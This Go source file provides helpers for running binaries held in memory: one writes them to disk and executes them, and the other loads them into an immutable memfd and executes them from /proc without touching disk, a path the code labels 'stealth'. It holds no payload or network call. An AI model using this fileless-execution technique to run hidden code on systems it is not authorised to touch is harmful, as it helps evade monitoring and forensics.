package exec

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"syscall"

	"github.com/justincormack/go-memfd"
)

//UnstealthyExec file retrieve output. TODO: output in real-time + handle input
func UnstealthyExec(filename string, argv []string, envv []string) (err error) {
	defer os.Remove(filename) //with runtime.GOOS != "windows" we could remove earlier
	cmd := exec.Command("./" + filename)
	cmd.Args = argv
	cmd.Env = envv
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return err
	}

	if err := cmd.Start(); err != nil {
		return err
	}

	data, err := ioutil.ReadAll(stdout)

	if err != nil {
		return err
	}
	if err := cmd.Wait(); err != nil {
		return err
	}

	fmt.Println(string(data))
	return err
}

//Exec binary file using file descriptor
//Note: syscall.Exec does not return on success, it causes the current process to be replaced by the one executed
func Fexecve(fd uintptr, argv []string, envv []string) (err error) {
	fname := fmt.Sprintf("/proc/%d/fd/%d", os.Getpid(), fd)
	err = syscall.Exec(fname, argv, envv)
	return err
}

// Write Binary file on disk and chmod it to make it execetuble
func WriteBinaryFile(filename string, content string) (err error) {
	f, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString(content)
	if err != nil {
		return err
	}
	//Make file executable
	err = os.Chmod(filename, 0700)
	if err != nil {
		return err
	}
	return nil
}

//Create a memfd with binary content and return it
func PrepareStealthExec(content string) (mfd *memfd.Memfd) {
	mfd, err := memfd.Create()
	if err != nil {
		panic(err)
	}
	//defer mfd.Close()
	_, _ = mfd.WriteString(content)
	err = mfd.SetImmutable()
	if err != nil {
		panic(err)
	}

	return mfd
}
